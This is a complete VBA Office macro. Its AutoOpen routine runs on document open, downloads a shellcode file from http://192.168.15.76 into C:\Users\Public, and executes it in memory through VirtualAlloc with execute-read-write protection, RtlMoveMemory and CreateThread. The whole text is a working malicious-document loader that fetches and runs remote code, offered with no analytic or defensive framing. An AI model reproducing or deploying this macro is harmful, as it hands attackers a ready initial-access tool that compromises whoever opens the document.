Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As LongPtr, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
    RunShellcode
End Sub

Sub RunShellcode()
    Dim shellcodePath As String
    shellcodePath = "C:\Users\Public\shellcode.bin"
    
    If DownloadFile("http://192.168.15.76/shellcode.bin", shellcodePath) Then
        ExecuteShellcode shellcodePath
    End If
End Sub

Function DownloadFile(URL As String, filePath As String) As Boolean
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    
    On Error Resume Next
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", URL, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.SaveToFile filePath, 2
        objADOStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If

    On Error GoTo 0
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
End Function

Sub ExecuteShellcode(filePath As String)
    Dim sc() As Byte
    Dim addr As LongPtr
    
    sc = ReadBinFile(filePath)
    
    If UBound(sc) < 0 Then Exit Sub
    
    addr = VirtualAlloc(0, UBound(sc) + 1, &H1000 Or &H2000, &H40)
    
    RtlMoveMemory addr, sc(0), UBound(sc) + 1
    
    CreateThread 0, 0, addr, 0, 0, 0
End Sub

Function ReadBinFile(filePath As String) As Byte()
    Dim fileNum As Integer
    Dim fileSize As Long
    Dim fileData() As Byte
    
    If Dir(filePath) = "" Then Exit Function
    
    fileNum = FreeFile
    Open filePath For Binary As #fileNum
    fileSize = LOF(fileNum)
    
    If fileSize = 0 Then
        Close #fileNum
        Exit Function
    End If
    
    ReDim fileData(fileSize - 1)
    Get #fileNum, , fileData
    Close #fileNum
    
    ReadBinFile = fileData
End Function

